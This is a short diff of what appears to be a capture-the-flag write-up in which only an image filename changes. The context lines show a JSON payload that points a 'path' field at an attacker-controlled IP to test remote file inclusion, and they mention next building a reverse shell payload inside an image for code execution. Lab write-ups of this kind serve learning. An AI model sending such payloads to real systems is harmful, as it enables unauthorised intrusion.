@@ -290,7 +290,7 @@ The above exploit uses an RFI to load some PHP objects for RCE. We can test this
 {"path":"http://10.10.14.64/hiiamrfi","effect":"wave"}
 ```
 
-<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 Since this was vulnerable to RFI, there's a high chance that it is vulnerable to the exploit above. We can follow the PoC to make it work. Firstly, we need to create a reverse shell payload within an image.&#x20;
 
